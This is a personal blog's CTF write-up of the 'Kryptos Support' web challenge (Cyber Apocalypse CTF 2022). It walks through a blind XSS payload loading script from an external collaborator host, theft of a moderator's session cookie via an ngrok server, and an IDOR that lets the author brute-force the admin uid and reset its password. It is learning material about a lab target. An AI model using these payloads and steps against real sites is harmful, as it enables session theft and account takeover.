---
layout: distill
published: true
title: Web - Kryptos Support Writeup
date: 2022-05-15 11:09:00+0700
description: Writeup for Kryptos Support Challenge. Cyber Apocalypse CTF 2022 - Intergalactic Chase
tags: ctf
# tags: distill formatting
categories: write-ups
thumbnail: assets/img/cyber-apocalypse-ctf-2022/kryptos-1.png # change this
giscus_comments: true
related_posts: true
featured: true

authors:
  - name: Dwiki Kusuma
    url: "https://twitter.com/qlkwej"
    affiliations:
      name: qlkwej
toc:
  - name: TL;DR
  - name: Challenge Description
  - name: Problem
  - name: Attack vectors
    subsections:
      - name: Checking the ticket creating process
  - name: Solution
  - name: Lesson Learned
    subsections:
      - name: Login using default password
      - name: Bypass client-side validation

---


{% details Disclaimer %}
I am not a CTF addict nor maniac, I do CTF for fun and learning purpose. 
So, if you are looking for a writeup that is very detailed and easy to understand, I suggest you to find another writeup. 

This writeup is just a note for myself and maybe for someone who is looking for a hint to solve the challenge.
Feedback /  comments / PRs are welcome :)
{% enddetails %}

## TL;DR
This writeup is about Kryptos Support challenge from Cyber Apocalypse CTF 2022 - Intergalactic Chase. To get the flag we need to chain a blind XSS and IDOR vulnerability.

## Challenge Description

<div class="row mt-3">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.html path="assets/img/cyber-apocalypse-ctf-2022/kryptos-1.png" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

Upon checking the challenge description, we are given a short description about the challenge.

> The secret vault used by the longhir's planet council, Kryptos, contains some very sensitive state secret that Virgil adn Ramona are after to prove injustice performed by the commision. Ulysses performed an initial recon at their request and found a support portal for the vault.
Can you take a look if you can inflitrate this system? 

Let start the challenge by visiting the given link.

<div class="row mt-3">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.html path="assets/img/cyber-apocalypse-ctf-2022/kryptos-2.png" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
*** 

## Problem

<div class="row mt-3">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.html path="assets/img/cyber-apocalypse-ctf-2022/kryptos-3.png" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
The application is a reporting website that allows user to report a problem. There is a keyword `an admin will review your ticket shortly`.
So, I assume there is a cronjob that run behind the scene to check the ticket and send the report to the admin.

***

## Attack vectors
Let's do basic recon to get more information about the application. I use gobuster<d-footnote>https://github.com/OJ/gobuster</d-footnote> for this purpuse and found several directory, such as:
```
- admin
- logout
- login
- static
- settings
- tickets
```

<div class="row mt-3">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.html path="assets/img/cyber-apocalypse-ctf-2022/kryptos-5.png" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

So we have two piece of puzzle as a `hints`, which was:
1. The admin will review the ticket shortly.
2. The mentioned page / directory above.

The best case scenario is the admin will review the ticket (which contaions blind XSS or CSRF vulnerability) and login to the application. So, we can login to the dashboard (maybe).
But the question is, where is the starting point?

### Checking the ticket creating process
Let's create a ticket and see what happen behind the scene. I use burp suite to intercept the request and send it to repeater. 

<div class="row mt-3">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.html path="assets/img/cyber-apocalypse-ctf-2022/kryptos-4.png" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

The request is a POST request with a JSON body to `POST /api/tickets/add`. The body contains a `message`  of the ticket, and it returns a response which indicates the admin will review our message shortly.

Okay, this is maybe the starting point. Let's try to inject a XSS payload to the message and see what happen.


<div class="row mt-3">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.html path="assets/img/cyber-apocalypse-ctf-2022/kryptos-8.png" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

I use a vanilla javascript payload with the burpsuite collabolator URL as the endpoint. The payload is `"><script src="https://collabolator/test.js"></script>`.

I receive a DNS and HTTP request from the application server to the collabolator server. So, the application is vulnerable to blind XSS.
<div class="row mt-3">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.html path="assets/img/cyber-apocalypse-ctf-2022/kryptos-7.png" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

The next step is to steal the cookie if it's using a cookie based authentication using XMLHttpRequest <d-footnote>https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/withCredentials</d-footnote>. 

I create a dummy server using ngrok <d-footnote>https://ngrok.com/</d-footnote> to host the javascript exploit and use it to receive the request from the application server.

<div class="row mt-3">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.html path="assets/img/cyber-apocalypse-ctf-2022/kryptos-10.png" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

I receive a request from the application server and it contains a cookie. So, the application is using a cookie based authentication. Because if it's using a header based authentication, the exploit won't work.

***


## Solution

Checking the session cookie format, it is a JWT token. So, we can decode the token and see what is inside the token.

<div class="row mt-3">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.html path="assets/img/cyber-apocalypse-ctf-2022/kryptos-11.png" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

Based on the `payload data` it is the `moderator` session. But why not `admin` ? Perhaps there still one missing piece, but will keep it for  observation later.

Use the session cookie from the previous step to login to the application. I use the `Cookie Editor` extension <d-footnote> https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/ </d-footnote>for firefox to change the cookie value.

I can login to the application and see the dashboard. But, there is no flag in the dashboard. So, I assume the flag is in the admin dashboard.
I check all the feature in `moderator` dashboard and found a `change password` feature which is vulnerable to IDOR.


<div class="row mt-3">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.html path="assets/img/cyber-apocalypse-ctf-2022/kryptos-12.png" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<div class="row mt-3">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.html path="assets/img/cyber-apocalypse-ctf-2022/kryptos-13.png" class="img-fluid rounded z-depth-1" %}
    </div>
</div>


When I put the new password, it will send a POST request to `POST /api/users/update` with a JSON body. The body contains a `password` and `uid` field. The IDOR vulnearbility was in `uid`. IF we can change the `uid` value to the `uid` own by the `admin` we can change the admin password. Since it's a increamental number, so we can bruteforce it from 001-999 _(the current user is moderator with `uid` 100 so admin must be between that range)_.

After several iteration, we found the admin `uid` it is `uid: 001`
<div class="row mt-3">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.html path="assets/img/cyber-apocalypse-ctf-2022/kryptos-14.png" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

Change the admin password on the `change password` feature and login to the admin dashboard. The flag is in the admin dashboard.
<div class="row mt-3">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.html path="assets/img/cyber-apocalypse-ctf-2022/kryptos-15.png" class="img-fluid rounded z-depth-1" %}
    </div>
</div>


flag: `HTB{x55_4nd_id0rs_ar3_fun!!}`


***

## Lesson Learned

I learn several things from this challenge:

### Login using default password
The easiest way to login to the application is to use the default password. I try to use `admin:admin` but it won't work. But, it's not a bad idea to try the default password first, because in realworld this scenario is still happen.

<div class="row mt-3">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.html path="assets/img/cyber-apocalypse-ctf-2022/kryptos-6.png" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

### Bypass client-side validation

At first, I check the client-side login validation. Whether it using a weak validation and I can bypass the flow. But, turns out it's a rabbit hole.
It's only give us information if the login were successfull, it will redirected to `/tickets` page

<div class="row mt-3">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.html path="assets/img/cyber-apocalypse-ctf-2022/kryptos-9.png" class="img-fluid rounded z-depth-1" %}
    </div>
</div>